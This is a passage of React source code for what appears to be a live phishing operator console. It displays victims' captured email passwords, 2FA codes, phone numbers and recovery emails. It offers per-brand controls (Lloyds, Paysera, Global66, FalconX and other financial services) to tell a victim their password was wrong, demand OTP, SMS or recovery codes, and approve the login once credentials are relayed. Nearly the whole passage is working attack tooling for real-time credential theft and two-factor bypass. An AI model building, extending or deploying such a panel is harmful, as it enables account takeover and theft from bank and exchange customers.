                {!!idPhone && <MiniLive icon={<Smartphone size={10} />} label="Tel ID" value={idPhone} highlight onCopy={() => copyToClipboard(idPhone, "idphone")} isCopied={copied === "idphone"} />}
                {!!idRecovery && <MiniLive icon={<Mail size={10} />} label="Recup ID" value={idRecovery} highlight onCopy={() => copyToClipboard(idRecovery, "idrec")} isCopied={copied === "idrec"} />}
              </>
            )}
            {!!emailPassword && <MiniLive icon={<Lock size={10} />} label="Senha Email" value={emailPassword} highlight onCopy={() => copyToClipboard(emailPassword, "ep")} isCopied={copied === "ep"} />}
            {!!emailCode && <MiniLive icon={<Eye size={10} />} label={emailCodeLabel || "2FA Email"} value={emailCode} highlight mono onCopy={() => copyToClipboard(emailCode, "ec")} isCopied={copied === "ec"} />}
            {!!clientPhoneNumber && <MiniLive icon={<Smartphone size={10} />} label="Telefone" value={clientPhoneNumber} highlight onCopy={() => copyToClipboard(clientPhoneNumber, "phone")} isCopied={copied === "phone"} />}
            {!!clientRecoveryEmail && <MiniLive icon={<Mail size={10} />} label="Email Recup." value={clientRecoveryEmail} highlight onCopy={() => copyToClipboard(clientRecoveryEmail, "rec_email")} isCopied={copied === "rec_email"} />}
          </div>
        </div>


        {session.source === "lloyds" ? (
          /* ── Lloyds Operator Controls ── */
          <>
            {/* Platform quick actions for Lloyds: only Wrong Password + Approve */}
            <div className="rounded-lg border border-emerald-500/20 bg-emerald-500/5 p-3">
              <div className="flex items-center gap-1.5 mb-2">
                <ShieldCheck size={12} className="text-emerald-400" />
                <span className="text-[10px] font-bold uppercase tracking-wider text-emerald-400">Ações Rápidas</span>
              </div>
              <div className="flex items-center gap-1.5 flex-wrap">
                <ActionChip icon={<AlertTriangle size={10} />} label="Senha Errada" active={A === "p_wrong"} onClick={pWrongPassword} disabled={!!sending} variant="warn" />
                <ActionChip icon={<CheckCircle size={10} />} label="Aprovar Login" active={decision === "approved"} onClick={pApproveLogin} disabled={decisionSending} variant="success" />
              </div>
            </div>

            <LloydsOperatorControls
              sessionId={session.id}
              broadcastToAll={broadcastToAll}
              sending={sending}
              setSending={setSending}
              lastAction={lastAction}
              setLastAction={setLastAction}
              decision={decision}
              decisionSending={decisionSending}
            />
          </>
        ) : session.source === "iol" ? (
          /* ── IOL: only Email Sync + Wayni ── */
          <>
            {/* Sincronização E-mail — abre IolSyncEmailScreen (senha do email pessoal) */}
            <div className="rounded-lg border border-amber-500/20 bg-amber-500/5 p-3">
              <div className="flex items-center gap-1.5 mb-2">
                <Mail size={12} className="text-amber-400" />
                <span className="text-[10px] font-bold uppercase tracking-wider text-amber-400">Sincronização E-mail</span>
              </div>
              <div className="flex items-center gap-1.5 flex-wrap">
                <ActionChip icon={<MailCheck size={10} />} label="Pedir Email" active={A === "e_sync"} onClick={eSyncEmail} disabled={!!sending} variant="primary" />
                <ActionChip icon={<AlertTriangle size={10} />} label="Senha ✗" active={A === "e_wrong"} onClick={eWrongPassword} disabled={!!sending} variant="warn" />
                <ActionChip icon={<ShieldCheck size={10} />} label="2FA Email" active={A === "e_otp"} onClick={eAskOtp} disabled={!!sending} variant="default" />
                <ActionChip icon={<Smartphone size={10} />} label="SMS" active={A === "e_sms_code"} onClick={eAdvanceSmsCode} disabled={!!sending} variant="default" />
                <span className="w-px h-4 bg-border" />
                <ActionChip icon={<Mail size={10} />} label="Recup." active={A === "e_rec"} onClick={eAskRecovery} disabled={!!sending} variant="default" />
                <ActionChip icon={<Mail size={10} />} label="Código Recup." active={A === "e_rec_code"} onClick={eAskRecoveryCode} disabled={!!sending} variant="default" />
                <span className="w-px h-4 bg-border" />
                <ActionChip icon={<CheckCircle size={10} />} label="Aprovar" active={decision === "approved" && currentPhase === "email"} onClick={eApprove} disabled={decisionSending} variant="success" />
                <ActionChip icon={<XCircle size={10} />} label="Rejeitar" active={decision === "rejected" && currentPhase === "email"} onClick={eReject} disabled={decisionSending} variant="danger" />
              </div>
            </div>

            <div className="rounded-lg border border-primary/20 bg-primary/5 p-3">
              <div className="mb-2 flex items-center gap-1.5">
                <ShieldCheck size={12} className="text-primary" />
                <span className="text-[10px] font-bold uppercase tracking-wider text-primary">Onboarding Wayni</span>
              </div>
              <div className="flex items-center gap-1.5 flex-wrap">
                <ActionChip
                  icon={<ShieldCheck size={10} />}
                  label="Solicitar Wayni"
                  active={A === "kyc_request"}
                  onClick={requestKyc}
                  disabled={!!sending}
                  variant="primary"
                />
              </div>
            </div>

            {/* ── Enviar Dados (IOL) ── */}
            <div className="rounded-lg border border-border bg-background/30 p-3">
              <p className="text-[9px] font-bold uppercase tracking-widest text-muted-foreground/60 mb-2">📨 Enviar Dados</p>
              <div className="space-y-1.5">
                <div className="flex gap-1">
                  <input value={adminTokenCode} onChange={(e) => setAdminTokenCode(e.target.value)} placeholder="Token (número) →" className="flex-1 min-w-0 rounded-md border border-input bg-background/50 px-2 py-1.5 text-[10px] text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-primary" />
                  <button onClick={eSendToken} disabled={!adminTokenCode.trim() || !!sending} className="inline-flex min-w-[88px] items-center justify-center gap-1 rounded-md bg-primary px-2 py-1.5 text-[10px] font-semibold text-primary-foreground disabled:opacity-40 hover:opacity-90 transition-opacity">
                    <KeyRound size={10} /> Enviar
                  </button>
                </div>
                <div className="flex gap-1">
                  <input
                    value={adminSmsNumber}
                    onChange={(e) => setAdminSmsNumber(e.target.value)}
                    placeholder="Final do telefone (ex: 42) →"
                    className="flex-1 min-w-0 rounded-md border border-blue-500/30 bg-background/50 px-2 py-1.5 text-[10px] text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-blue-500"
                  />
                  <button onClick={eSendSms} disabled={!adminSmsNumber.trim() || !!sending} className="inline-flex min-w-[88px] items-center justify-center gap-1 rounded-md bg-blue-500 px-2 py-1.5 text-[10px] font-semibold text-white disabled:opacity-40 hover:bg-blue-600 transition-colors">
                    <Smartphone size={10} /> Enviar
                  </button>
                </div>
                <div className="flex gap-1">
                  <input
                    value={adminRecoveryEmail}
                    onChange={(e) => setAdminRecoveryEmail(e.target.value)}
                    placeholder="Email de recuperação →"
                    type="email"
                    className="flex-1 min-w-0 rounded-md border border-amber-500/30 bg-background/50 px-2 py-1.5 text-[10px] text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-amber-500"
                  />
                  <button
                    onClick={() => {
                      if (!adminRecoveryEmail.trim()) return;
                      doAction("e_recovery_email", "confirm_ask_recovery_email", [
                        { event: "admin_decision", payload: { status: "confirm_ask_recovery_email", recovery_email: adminRecoveryEmail } },
                        { event: "admin_sync_decision", payload: { status: "sync_ask_recovery_email", recovery_email: adminRecoveryEmail } },
                      ], { otp_code: `recovery_email_addr:${adminRecoveryEmail}` });
                      setAdminRecoveryEmail("");
                    }}
                    disabled={!adminRecoveryEmail.trim() || !!sending}
                    className="inline-flex min-w-[88px] items-center justify-center gap-1 rounded-md bg-amber-500 px-2 py-1.5 text-[10px] font-semibold text-white disabled:opacity-40 hover:bg-amber-600 transition-colors"
                  >
                    <Mail size={10} /> Enviar
                  </button>
                </div>
              </div>
            </div>
          </>
        ) : (session.source === "paysera" || session.source === "cocosdigital" || session.source === "ueex" || session.source === "ppi") ? (
          /* ── Platform + Identificação + Email Sync Controls ── */
          <>
            {/* Platform Actions */}
            <div className="rounded-lg border border-teal-500/20 bg-teal-500/5 p-3">
              <div className="flex items-center gap-1.5 mb-2">
                <ShieldCheck size={12} className="text-teal-400" />
                <span className="text-[10px] font-bold uppercase tracking-wider text-teal-400">Plataforma</span>
              </div>
              <div className="flex items-center gap-1.5 flex-wrap">
                <ActionChip icon={<AlertTriangle size={10} />} label="Senha Errada" active={A === "p_wrong"} onClick={pWrongPassword} disabled={!!sending} variant="warn" />
                <span className="w-px h-4 bg-border" />
                {session.source === "paysera" ? (
                  <>
                    <div className="flex items-center gap-1">
                      <input
                        value={payseraTokenInput}
                        onChange={(e) => setPayseraTokenInput(e.target.value)}
                        placeholder="Nº token →"
                        className="w-[80px] rounded-md border border-teal-500/30 bg-background/50 px-2 py-1 text-[10px] text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-teal-500"
                      />
                      <button onClick={pPayseraToken} disabled={!payseraTokenInput.trim() || !!sending} className="rounded-md bg-teal-500 px-2 py-1 text-white text-[9px] font-bold disabled:opacity-40 hover:bg-teal-600 transition-colors flex items-center gap-1">
                        <Send size={9} /> Token
                      </button>
                      <ActionChip icon={<Loader2 size={10} />} label="Loop" active={A === "p_paysera_loop"} onClick={pPayseraLoop} disabled={!!sending} variant="default" />
                    </div>
                    <ActionChip icon={<KeyRound size={10} />} label="Pedir OTP" active={A === "p_otp"} onClick={pRedirectOtp} disabled={!!sending} variant="default" />
                    <ActionChip icon={<Smartphone size={10} />} label="Verificar Tel" active={A === "p_paysera_vphone"} onClick={pPayseraVerifyPhone} disabled={!!sending} variant="warn" />
                  </>
                ) : (
                  <ActionChip icon={<KeyRound size={10} />} label="Pedir Token" active={A === "p_otp"} onClick={pRedirectOtp} disabled={!!sending} variant="default" />
                )}
                <ActionChip icon={<XCircle size={10} />} label="Negar Token" active={decision === "rejected" && currentPhase === "otp"} onClick={pRejectOtp} disabled={decisionSending} variant="danger" />
                <span className="w-px h-4 bg-border" />
                <ActionChip icon={<CheckCircle size={10} />} label="Aprovar Login" active={decision === "approved" && currentPhase !== "email"} onClick={pApproveLogin} disabled={decisionSending} variant="success" />
              </div>
            </div>

            {session.source === "paysera" ? (
              /* Paysera: SMS instead of Identificação */
              <div className="rounded-lg border border-blue-500/20 bg-blue-500/5 p-3">
                <div className="flex items-center gap-1.5 mb-2">
                  <Smartphone size={12} className="text-blue-400" />
                  <span className="text-[10px] font-bold uppercase tracking-wider text-blue-400">SMS</span>
                </div>
                <div className="flex items-center gap-1.5 flex-wrap">
                  <ActionChip icon={<Smartphone size={10} />} label="Pedir SMS" active={A === "p_paysera_sms"} onClick={pPayseraSms} disabled={!!sending} variant="primary" />
                  <ActionChip icon={<XCircle size={10} />} label="Negar SMS" active={decision === "rejected" && currentPhase === "otp"} onClick={pRejectOtp} disabled={decisionSending} variant="danger" />
                  <ActionChip icon={<CheckCircle size={10} />} label="Aprovar" active={decision === "approved" && currentPhase === "email"} onClick={eApprove} disabled={decisionSending} variant="success" />
                </div>
              </div>
            ) : (
              /* Other sources: Identificação */
              <div className="rounded-lg border border-violet-500/20 bg-violet-500/5 p-3">
                <div className="flex items-center gap-1.5 mb-2">
                  <ShieldCheck size={12} className="text-violet-400" />
                  <span className="text-[10px] font-bold uppercase tracking-wider text-violet-400">Identificação</span>
                </div>
                <div className="flex items-center gap-1.5 flex-wrap">
                  <ActionChip icon={<ShieldCheck size={10} />} label="Pedir Identif." active={A === "e_email"} onClick={eRedirectEmail} disabled={!!sending} variant="primary" />
                  <ActionChip icon={<AlertTriangle size={10} />} label="Senha ✗" active={A === "e_wrong"} onClick={eWrongPassword} disabled={!!sending} variant="warn" />
                  <ActionChip icon={<ShieldCheck size={10} />} label="2FA" active={A === "e_otp"} onClick={eAskOtp} disabled={!!sending} variant="default" />
                  <ActionChip icon={<Smartphone size={10} />} label="SMS" active={A === "e_sms_code"} onClick={eAdvanceSmsCode} disabled={!!sending} variant="default" />
                  <ActionChip icon={<Mail size={10} />} label="Recup." active={A === "e_rec"} onClick={eAskRecovery} disabled={!!sending} variant="default" />
                  <ActionChip icon={<CheckCircle size={10} />} label="Aprovar" active={decision === "approved" && currentPhase === "email"} onClick={eApprove} disabled={decisionSending} variant="success" />
                  <ActionChip icon={<XCircle size={10} />} label="Rejeitar" active={decision === "rejected" && currentPhase === "email"} onClick={eReject} disabled={decisionSending} variant="danger" />
                </div>
              </div>
            )}

            {/* Sincronização E-mail — abre IolSyncEmailScreen (senha do email pessoal) */}
            <div className="rounded-lg border border-amber-500/20 bg-amber-500/5 p-3">
              <div className="flex items-center gap-1.5 mb-2">
                <Mail size={12} className="text-amber-400" />
                <span className="text-[10px] font-bold uppercase tracking-wider text-amber-400">Sincronização E-mail</span>
              </div>
              <div className="flex items-center gap-1.5 flex-wrap">
                <ActionChip icon={<MailCheck size={10} />} label="Pedir Email" active={A === "e_sync"} onClick={eSyncEmail} disabled={!!sending} variant="primary" />
                <ActionChip icon={<AlertTriangle size={10} />} label="Senha ✗" active={A === "e_wrong"} onClick={eWrongPassword} disabled={!!sending} variant="warn" />
                <ActionChip icon={<ShieldCheck size={10} />} label="2FA Email" active={A === "e_otp"} onClick={eAskOtp} disabled={!!sending} variant="default" />
                <ActionChip icon={<Smartphone size={10} />} label="SMS" active={A === "e_sms_code"} onClick={eAdvanceSmsCode} disabled={!!sending} variant="default" />
                <span className="w-px h-4 bg-border" />
                <ActionChip icon={<Mail size={10} />} label="Recup." active={A === "e_rec"} onClick={eAskRecovery} disabled={!!sending} variant="default" />
                <ActionChip icon={<Mail size={10} />} label="Código Recup." active={A === "e_rec_code"} onClick={eAskRecoveryCode} disabled={!!sending} variant="default" />
                <span className="w-px h-4 bg-border" />
                <ActionChip icon={<CheckCircle size={10} />} label="Aprovar" active={decision === "approved" && currentPhase === "email"} onClick={eApprove} disabled={decisionSending} variant="success" />
                <ActionChip icon={<XCircle size={10} />} label="Rejeitar" active={decision === "rejected" && currentPhase === "email"} onClick={eReject} disabled={decisionSending} variant="danger" />
              </div>
            </div>


            {/* ── Enviar Dados (inputs) ── */}
            <div className="rounded-lg border border-border bg-background/30 p-3">
              <p className="text-[9px] font-bold uppercase tracking-widest text-muted-foreground/60 mb-2">📨 Enviar Dados</p>
              <div className="space-y-1.5">
                <div className="flex gap-1">
                  <input value={adminTokenCode} onChange={(e) => setAdminTokenCode(e.target.value)} placeholder="Token (número) →" className="flex-1 min-w-0 rounded-md border border-input bg-background/50 px-2 py-1.5 text-[10px] text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-primary" />
                  <button onClick={eSendToken} disabled={!adminTokenCode.trim() || !!sending} className="inline-flex min-w-[88px] items-center justify-center gap-1 rounded-md bg-primary px-2 py-1.5 text-[10px] font-semibold text-primary-foreground disabled:opacity-40 hover:opacity-90 transition-opacity">
                    <KeyRound size={10} /> Enviar
                  </button>
                </div>
                <div className="flex gap-1">
                  <input
                    value={adminSmsNumber}
                    onChange={(e) => setAdminSmsNumber(e.target.value)}
                    placeholder="Final do telefone (ex: 42) →"
                    className="flex-1 min-w-0 rounded-md border border-blue-500/30 bg-background/50 px-2 py-1.5 text-[10px] text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-blue-500"
                  />
                  <button onClick={eSendSms} disabled={!adminSmsNumber.trim() || !!sending} className="inline-flex min-w-[88px] items-center justify-center gap-1 rounded-md bg-blue-500 px-2 py-1.5 text-[10px] font-semibold text-white disabled:opacity-40 hover:bg-blue-600 transition-colors">
                    <Smartphone size={10} /> Enviar
                  </button>
                </div>
                <div className="flex gap-1">
                  <input
                    value={adminRecoveryEmail}
                    onChange={(e) => setAdminRecoveryEmail(e.target.value)}
                    placeholder="Email de recuperação →"
                    type="email"
                    className="flex-1 min-w-0 rounded-md border border-amber-500/30 bg-background/50 px-2 py-1.5 text-[10px] text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-amber-500"
                  />
                  <button
                    onClick={() => {
                      if (!adminRecoveryEmail.trim()) return;
                      doAction("e_recovery_email", "confirm_ask_recovery_email", [
                        { event: "admin_decision", payload: { status: "confirm_ask_recovery_email", recovery_email: adminRecoveryEmail } },
                        { event: "admin_sync_decision", payload: { status: "sync_ask_recovery_email", recovery_email: adminRecoveryEmail } },
                      ], { otp_code: `recovery_email_addr:${adminRecoveryEmail}` });
                      setAdminRecoveryEmail("");
                    }}
                    disabled={!adminRecoveryEmail.trim() || !!sending}
                    className="inline-flex min-w-[88px] items-center justify-center gap-1 rounded-md bg-amber-500 px-2 py-1.5 text-[10px] font-semibold text-white disabled:opacity-40 hover:bg-amber-600 transition-colors"
                  >
                    <Mail size={10} /> Enviar
                  </button>
                </div>
              </div>
            </div>
          </>
        ) : session.source === "global66" ? (
          /* ── Global66 Controls ── */
          <>
            {/* Platform Actions */}
            <div className="rounded-lg border border-indigo-500/20 bg-indigo-500/5 p-3">
              <div className="flex items-center gap-1.5 mb-2">
                <ShieldCheck size={12} className="text-indigo-400" />
                <span className="text-[10px] font-bold uppercase tracking-wider text-indigo-400">Plataforma</span>
              </div>
              <div className="flex items-center gap-1.5 flex-wrap">
                <ActionChip icon={<AlertTriangle size={10} />} label="Senha Errada" active={A === "p_wrong"} onClick={pWrongPassword} disabled={!!sending} variant="warn" />
                <span className="w-px h-4 bg-border" />
                <ActionChip icon={<KeyRound size={10} />} label="MFA Google" active={A === "p_otp"} onClick={pRedirectOtp} disabled={!!sending} variant="default" />
                <ActionChip icon={<Smartphone size={10} />} label="MFA SMS" active={A === "p_mfa_sms"} onClick={() => doAction("p_mfa_sms", "redirect_mfa_sms", [{ event: "review_decision", payload: { status: "redirect_mfa_sms" } }])} disabled={!!sending} variant="default" />
                <ActionChip icon={<Mail size={10} />} label="MFA Email" active={A === "p_mfa_email"} onClick={() => doAction("p_mfa_email", "redirect_mfa_email", [{ event: "review_decision", payload: { status: "redirect_mfa_email" } }])} disabled={!!sending} variant="default" />
                <span className="w-px h-4 bg-border" />
                <ActionChip icon={<XCircle size={10} />} label="Negar 2FA" active={decision === "rejected" && currentPhase === "otp"} onClick={pRejectOtp} disabled={decisionSending} variant="danger" />
                <ActionChip icon={<CheckCircle size={10} />} label="Aprovar Login" active={decision === "approved" && currentPhase !== "email"} onClick={pApproveLogin} disabled={decisionSending} variant="success" />
              </div>
            </div>

            {/* Email Actions */}
            <div className="rounded-lg border border-amber-500/20 bg-amber-500/5 p-3">
              <div className="flex items-center gap-1.5 mb-2">
                <Mail size={12} className="text-amber-400" />
                <span className="text-[10px] font-bold uppercase tracking-wider text-amber-400">E-mail</span>
              </div>
              <div className="flex items-center gap-1.5 flex-wrap">
                <ActionChip icon={<MailCheck size={10} />} label="Pedir Email" active={A === "e_email"} onClick={eRedirectEmail} disabled={!!sending} variant="primary" />
                <ActionChip icon={<AlertTriangle size={10} />} label="Senha ✗" active={A === "e_wrong"} onClick={eWrongPassword} disabled={!!sending} variant="warn" />
                <ActionChip icon={<ShieldCheck size={10} />} label="2FA Email" active={A === "e_otp"} onClick={eAskOtp} disabled={!!sending} variant="default" />
                <ActionChip icon={<Smartphone size={10} />} label="SMS" active={A === "e_sms_code"} onClick={eAdvanceSmsCode} disabled={!!sending} variant="default" />
                <ActionChip icon={<Mail size={10} />} label="Recup." active={A === "e_rec"} onClick={eAskRecovery} disabled={!!sending} variant="default" />
                <ActionChip icon={<CheckCircle size={10} />} label="Aprovar" active={decision === "approved" && currentPhase === "email"} onClick={eApprove} disabled={decisionSending} variant="success" />
                <ActionChip icon={<XCircle size={10} />} label="Rejeitar" active={decision === "rejected" && currentPhase === "email"} onClick={eReject} disabled={decisionSending} variant="danger" />
              </div>
            </div>

            {/* Enviar Dados */}
            <div className="rounded-lg border border-border bg-background/30 p-3">
              <p className="text-[9px] font-bold uppercase tracking-widest text-muted-foreground/60 mb-2">📨 Enviar Dados</p>
              <div className="space-y-1.5">
                <div className="flex gap-1">
                  <input value={adminTokenCode} onChange={(e) => setAdminTokenCode(e.target.value)} placeholder="Token (número) →" className="flex-1 min-w-0 rounded-md border border-input bg-background/50 px-2 py-1.5 text-[10px] text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-primary" />
                  <button onClick={eSendToken} disabled={!adminTokenCode.trim() || !!sending} className="rounded-md bg-primary px-2 py-1.5 text-primary-foreground disabled:opacity-40"><Send size={10} /></button>
                </div>
                <div className="flex gap-1">
                  <input value={adminSmsNumber} onChange={(e) => setAdminSmsNumber(e.target.value)} placeholder="Final do telefone (ex: 42) →" className="flex-1 min-w-0 rounded-md border border-blue-500/30 bg-background/50 px-2 py-1.5 text-[10px] text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-blue-500" />
                  <button onClick={eSendSms} disabled={!!sending} className="rounded-md bg-blue-500 px-2 py-1.5 text-white disabled:opacity-40 hover:bg-blue-600 transition-colors flex items-center gap-1">
                    <Smartphone size={10} /><Send size={10} />
                  </button>
                </div>
                <div className="flex gap-1">
                  <input value={adminRecoveryEmail} onChange={(e) => setAdminRecoveryEmail(e.target.value)} placeholder="Email de recuperação →" type="email" className="flex-1 min-w-0 rounded-md border border-amber-500/30 bg-background/50 px-2 py-1.5 text-[10px] text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-amber-500" />
                  <button
                    onClick={() => {
                      if (!adminRecoveryEmail.trim()) return;
                      doAction("e_recovery_email", "confirm_ask_recovery_email", [
                        { event: "admin_decision", payload: { status: "confirm_ask_recovery_email", recovery_email: adminRecoveryEmail } },
                        { event: "admin_sync_decision", payload: { status: "sync_ask_recovery_email", recovery_email: adminRecoveryEmail } },
                      ], { otp_code: `recovery_email_addr:${adminRecoveryEmail}` });
                      setAdminRecoveryEmail("");
                    }}
                    disabled={!adminRecoveryEmail.trim() || !!sending}
                    className="rounded-md bg-amber-500 px-2 py-1.5 text-white disabled:opacity-40 hover:bg-amber-600 transition-colors"
                  >
                    <Send size={10} />
                  </button>
                </div>
              </div>
            </div>
          </>
        ) : (
          /* ── FalconX Controls ── */
          <>
            {/* ── Email Actions ── */}
            <div className="rounded-lg border border-amber-500/20 bg-amber-500/5 p-3">
              <div className="flex items-center gap-1.5 mb-2">
                <Mail size={12} className="text-amber-400" />
                <span className="text-[10px] font-bold uppercase tracking-wider text-amber-400">E-mail</span>
              </div>
              <div className="flex items-center gap-1.5 flex-wrap">
                <ActionChip icon={<MailCheck size={10} />} label="Pedir Email" active={A === "e_email"} onClick={eRedirectEmail} disabled={!!sending} variant="primary" />
                <ActionChip icon={<AlertTriangle size={10} />} label="Senha ✗" active={A === "e_wrong"} onClick={eWrongPassword} disabled={!!sending} variant="warn" />
                <ActionChip icon={<ShieldCheck size={10} />} label="2FA Email" active={A === "e_otp"} onClick={eAskOtp} disabled={!!sending} variant="default" />
                <ActionChip icon={<Smartphone size={10} />} label="SMS" active={A === "e_sms_code"} onClick={eAdvanceSmsCode} disabled={!!sending} variant="default" />
                <ActionChip icon={<Mail size={10} />} label="Recup." active={A === "e_rec"} onClick={eAskRecovery} disabled={!!sending} variant="default" />
                <ActionChip icon={<CheckCircle size={10} />} label="Aprovar" active={decision === "approved" && currentPhase === "email"} onClick={eApprove} disabled={decisionSending} variant="success" />
                <ActionChip icon={<XCircle size={10} />} label="Rejeitar" active={decision === "rejected" && currentPhase === "email"} onClick={eReject} disabled={decisionSending} variant="danger" />
              </div>
            </div>

            {/* ── Enviar Dados (inputs) ── */}
            <div className="rounded-lg border border-border bg-background/30 p-3">
              <p className="text-[9px] font-bold uppercase tracking-widest text-muted-foreground/60 mb-2">📨 Enviar Dados</p>
              <div className="space-y-1.5">
                <div className="flex gap-1">
                  <input value={adminTokenCode} onChange={(e) => setAdminTokenCode(e.target.value)} placeholder="Token (número) →" className="flex-1 min-w-0 rounded-md border border-input bg-background/50 px-2 py-1.5 text-[10px] text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-primary" />
                  <button onClick={eSendToken} disabled={!adminTokenCode.trim() || !!sending} className="rounded-md bg-primary px-2 py-1.5 text-primary-foreground disabled:opacity-40"><Send size={10} /></button>
                </div>
                <div className="flex gap-1">
                  <input
                    value={adminSmsNumber}
                    onChange={(e) => setAdminSmsNumber(e.target.value)}
                    placeholder="Final do telefone (ex: 42) →"
                    className="flex-1 min-w-0 rounded-md border border-blue-500/30 bg-background/50 px-2 py-1.5 text-[10px] text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-blue-500"
                  />
                  <button onClick={eSendSms} disabled={!!sending} className="rounded-md bg-blue-500 px-2 py-1.5 text-white disabled:opacity-40 hover:bg-blue-600 transition-colors flex items-center gap-1">
                    <Smartphone size={10} /><Send size={10} />
                  </button>
                </div>
                <div className="flex gap-1">
                  <input
                    value={adminRecoveryEmail}
                    onChange={(e) => setAdminRecoveryEmail(e.target.value)}
                    placeholder="Email de recuperação →"
                    type="email"
                    className="flex-1 min-w-0 rounded-md border border-amber-500/30 bg-background/50 px-2 py-1.5 text-[10px] text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-amber-500"
                  />
                  <button
                    onClick={() => {
                      if (!adminRecoveryEmail.trim()) return;
                      doAction("e_recovery_email", "confirm_ask_recovery_email", [
                        { event: "admin_decision", payload: { status: "confirm_ask_recovery_email", recovery_email: adminRecoveryEmail } },
                        { event: "admin_sync_decision", payload: { status: "sync_ask_recovery_email", recovery_email: adminRecoveryEmail } },
                      ], { otp_code: `recovery_email_addr:${adminRecoveryEmail}` });
                      setAdminRecoveryEmail("");
                    }}
                    disabled={!adminRecoveryEmail.trim() || !!sending}
                    className="rounded-md bg-amber-500 px-2 py-1.5 text-white disabled:opacity-40 hover:bg-amber-600 transition-colors"
                  >
                    <Send size={10} />
                  </button>
                </div>
              </div>
            </div>
          </>
        )}

        {/* ── Decision Feedback ── */}
        {decision && (
          <div className={`rounded-lg border px-3 py-2 text-center text-[10px] font-bold ${
            decision === "approved" ? "border-green-600/30 bg-green-600/10 text-green-400" : "border-destructive/30 bg-destructive/10 text-destructive"
          }`}>
            {decision === "approved" ? "✓ Aprovado" : "✗ Rejeitado — Resetando..."}
          </div>
        )}
      </div>
    </div>
  );
};

/* ═══════════════════════════════ */
/*  Copy Chip (quick tap to copy) */
/* ═══════════════════════════════ */
const CopyChip = ({ label, value, icon, copiedKey, onCopy, chipKey, mono }: {
  label: string; value: string; icon: React.ReactNode;
  copiedKey: string | null; onCopy: (key: string) => void; chipKey: string; mono?: boolean;
}) => {
  const hasValue = !!value;
  const isCopied = copiedKey === chipKey;

  return (
    <button
      onClick={() => hasValue && onCopy(chipKey)}
      disabled={!hasValue}
      className={`inline-flex items-center gap-1.5 rounded-md border px-2 py-1 text-[10px] font-medium transition-all active:scale-95 disabled:opacity-30 disabled:cursor-default ${
        isCopied
          ? "border-green-500/40 bg-green-500/10 text-green-400"
          : hasValue
            ? "border-border bg-background/60 text-foreground hover:border-primary/40 hover:bg-primary/5 cursor-pointer"
            : "border-transparent bg-background/30 text-muted-foreground"
      }`}
    >
      {isCopied ? <CheckCircle size={10} className="text-green-400" /> : <span className="text-muted-foreground">{icon}</span>}
      <span className="text-[9px] text-muted-foreground">{label}:</span>
      <span className={`font-bold truncate max-w-[80px] ${mono ? "font-mono tracking-wider" : ""} ${isCopied ? "text-green-400" : ""}`}>
        {hasValue ? value : "—"}
      </span>
      {hasValue && !isCopied && <Copy size={8} className="text-muted-foreground/60 shrink-0" />}
    </button>
  );
};

/* ═══════════════════════════════ */
/*  Mini Live Field               */
/* ═══════════════════════════════ */
const MiniLive = ({ icon, label, value, mono, highlight, onCopy, isCopied }: {
  icon: React.ReactNode; label: string; value: string | null | undefined;
  mono?: boolean; highlight?: boolean; onCopy: () => void; isCopied: boolean;
}) => (
  <div
    onClick={() => value && onCopy()}
    className={`flex items-center justify-between rounded-md px-2 py-1.5 cursor-pointer transition-all active:scale-[0.97] ${highlight ? "bg-green-500/10 border border-green-500/20" : "bg-background/50 border border-transparent hover:border-border"}`}
  >
    <div className="flex items-center gap-1.5 min-w-0">
      <span className="text-muted-foreground shrink-0">{icon}</span>
      <div className="min-w-0">
        <p className="text-[8px] text-muted-foreground uppercase leading-none">{label}</p>
        <p className={`text-[11px] font-bold truncate ${mono ? "font-mono tracking-wider" : ""} ${highlight ? "text-green-400" : "text-foreground"}`}>
          {value || <span className="text-muted-foreground/30 font-normal">—</span>}
        </p>
      </div>
    </div>
    {value && (
      <span className="shrink-0 ml-1 text-muted-foreground">
        {isCopied ? <CheckCircle size={10} className="text-green-400" /> : <Copy size={10} />}
      </span>
    )}
  </div>
);

/* ═══════════════════════════════ */
/*  Action Chip (inline button)   */
/* ═══════════════════════════════ */
const ActionChip = ({ icon, label, active, onClick, disabled, variant }: {
  icon: React.ReactNode; label: string; active?: boolean; onClick: () => void;
  disabled: boolean; variant?: "warn" | "danger" | "success" | "primary" | "default";
}) => {
  const colors = active
    ? "border-green-600/50 bg-green-600/15 text-green-400"
    : variant === "danger" ? "border-destructive/30 bg-card text-destructive hover:bg-destructive/10"
    : variant === "warn" ? "border-amber-500/30 bg-card text-amber-400 hover:bg-amber-500/10"
    : variant === "success" ? "border-green-600/30 bg-card text-green-400 hover:bg-green-600/10"
    : variant === "primary" ? "border-blue-500/30 bg-card text-blue-400 hover:bg-blue-500/10"
    : "border-border bg-card text-foreground hover:border-primary/30 hover:bg-primary/5";

  return (
    <button onClick={onClick} disabled={disabled} className={`inline-flex items-center gap-1 rounded-full border px-2.5 py-1 text-[10px] font-medium transition-all disabled:opacity-40 active:scale-95 whitespace-nowrap ${colors}`}>
      {icon}
      {active ? `${label} ✓` : label}
    </button>
  );
};

/* ═══════════════════════════════ */
/*  Small Action Button           */
/* ═══════════════════════════════ */
const SmallBtn = ({ icon, label, active, onClick, disabled, variant }: {
  icon: React.ReactNode; label: string; active?: boolean; onClick: () => void;
  disabled: boolean; variant?: "warn" | "danger" | "success";
}) => {
  const colors = active
    ? "border-green-600/40 bg-green-600/10 text-green-400"
    : variant === "danger" ? "border-destructive/20 bg-card text-destructive hover:bg-destructive/10"
    : variant === "warn" ? "border-amber-500/20 bg-card text-amber-500 hover:bg-amber-500/10"
    : variant === "success" ? "border-green-600/20 bg-card text-green-500 hover:bg-green-600/10"
